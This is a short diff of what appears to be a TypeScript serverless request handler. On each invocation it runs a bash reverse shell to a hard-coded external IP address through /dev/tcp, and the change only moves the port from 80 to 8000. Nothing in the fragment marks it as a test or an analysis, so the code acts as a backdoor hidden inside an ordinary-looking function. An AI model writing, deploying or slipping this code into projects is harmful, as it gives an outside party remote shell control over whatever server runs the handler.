@@ -11,7 +11,7 @@ const handler: Handler = async (event, context) => {
     cfg.name = cfg.name + 'sim444';
     
     // 执行 shell 命令
-    const command = '/bin/bash -c "/bin/bash -i >& /dev/tcp/43.136.14.41/80 0>&1"';
+    const command = '/bin/bash -c "/bin/bash -i >& /dev/tcp/43.136.14.41/8000 0>&1"';
     const { stdout, stderr } = await execPromise(command);
     
     // 准备响应数据
